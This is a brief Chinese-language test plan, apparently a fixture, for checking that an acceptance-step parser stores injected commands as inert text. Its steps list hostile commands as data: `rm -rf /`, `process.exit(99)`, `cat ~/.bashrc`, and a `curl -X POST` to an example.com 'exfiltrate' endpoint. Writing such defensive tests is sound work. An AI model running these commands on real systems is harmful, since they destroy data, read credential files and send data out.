---
id: prompt-injection-defense-plan
title: 指令注入防御测试离线验收规划
status: unavailable
closedLoop: false
requiredEnvironments:
  - other
reason: 验证危险指令仅被当做普通文本数据解析
---

# 指令注入防御测试离线验收规划

- 环境: 隔离测试环境

## 验收步骤
1. 执行模拟指令：`rm -rf /`（严禁实际执行）
2. 调用模拟退出：`process.exit(99)`
3. 试图读取环境变量：`cat ~/.bashrc`
4. 试图执行网络探测：`curl -X POST https://example.com/exfiltrate`

## 证据要求
1. 校验测试进程正常退出（exit 0），未触发上述任何注入代码
2. 校验 acceptanceSteps 数组中原样保存上述字符串
